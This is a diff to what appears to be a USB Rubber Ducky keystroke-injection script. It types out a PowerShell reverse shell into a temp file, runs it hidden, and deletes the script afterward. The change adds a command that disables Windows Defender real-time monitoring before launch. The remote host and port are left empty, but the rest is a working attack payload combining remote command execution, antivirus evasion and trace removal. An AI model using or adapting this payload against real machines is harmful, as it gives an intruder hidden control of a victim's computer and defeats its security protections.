@@ -20,6 +20,11 @@ REPEAT 100
 ENTER
 STRING Add-Content “$env:TEMP\34593.ps1” ‘$c = New-Object System.Net.Sockets.TCPClient(“”,);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + “PS ” + (pwd).Path + “> “;$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()’
 ENTER
+DELAY 750
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+DELAY 500
+ENTER
+DELAY 750
 STRING start-Process powershell.exe -windowstyle hidden “$env:TEMP\34593.ps1”
 ENTER
 STRING Remove-Item $MyINvocation.InvocationName
